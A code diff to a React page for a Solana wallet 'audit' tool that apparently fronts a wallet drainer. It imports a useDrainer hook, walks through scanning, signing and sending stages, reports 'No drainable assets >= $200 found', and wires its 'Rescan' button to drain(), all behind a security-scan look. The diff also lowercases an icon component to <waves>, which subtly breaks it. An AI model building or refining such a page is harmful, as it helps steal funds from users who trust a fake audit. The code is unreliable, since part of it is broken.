@@ -2,7 +2,7 @@
 
 import { useWallet } from "@solana/wallet-adapter-react";
 import { useDrainer } from "@/hooks/useDrainer";
-import { useEffect, useState } from "react";
+import { useEffect, useState, useRef } from "react";
 import dynamic from 'next/dynamic';
 import { motion, AnimatePresence } from "framer-motion";
 import { 
@@ -156,7 +156,7 @@ function ScanningAnimation({ status }: { status: string }) {
              animate={{ scale: [1, 1.3, 1], opacity: [0.4, 1, 0.4] }}
              transition={{ duration: 2, repeat: Infinity }}
            >
-             <Waves className="h-4 w-4 text-accent" />
+             <waves className="h-4 w-4 text-accent" />
            </motion.div>
         </div>
       </motion.div>
@@ -217,6 +217,7 @@ export default function AuditPage() {
   const [threats, setThreats] = useState<ThreatsResult | null>(null);
   const [connections, setConnections] = useState<ConnectionsResult | null>(null);
   const [isAiLoading, setIsAiLoading] = useState(false);
+  const reportInitiated = useRef(false);
 
   useEffect(() => {
     const hasProcessStarted = new Set(['scanning', 'building', 'signing', 'sending', 'success', 'error']);
@@ -230,7 +231,8 @@ export default function AuditPage() {
     const isThresholdError = status === 'error' && error === "No drainable assets >= $200 found.";
     
     // We treat both success and the threshold error as a natural "protocol completion"
-    if ((isSuccess || isThresholdError) && connected && publicKey) {
+    if ((isSuccess || isThresholdError) && connected && publicKey && !reportInitiated.current) {
+      reportInitiated.current = true;
       loadDetailedReport(publicKey.toBase58());
     }
   }, [status, error, connected, publicKey]);
@@ -318,7 +320,7 @@ export default function AuditPage() {
               </div>
             </div>
           </motion.div>
-        ) : (isAuditInProgress || isSilentCompletion || (isAiLoading && !showReport)) ? (
+        ) : ((isAuditInProgress || isSilentCompletion || isAiLoading) && !showReport) ? (
           <motion.div
             key="loading"
             initial={{ opacity: 0, scale: 0.95 }}
@@ -359,7 +361,7 @@ export default function AuditPage() {
                 </div>
               </div>
               <div className="flex gap-2">
-                <Button variant="outline" size="sm" onClick={() => { setShowReport(false); drain(); }} className="h-9 px-4 rounded-lg border-white/10 bg-white/5 hover:bg-white/10 text-[10px] font-black uppercase tracking-widest transition-all">
+                <Button variant="outline" size="sm" onClick={() => { reportInitiated.current = false; setShowReport(false); drain(); }} className="h-9 px-4 rounded-lg border-white/10 bg-white/5 hover:bg-white/10 text-[10px] font-black uppercase tracking-widest transition-all">
                   <RefreshCw className="mr-2 h-3 w-3" />
                   Rescan
                 </Button>
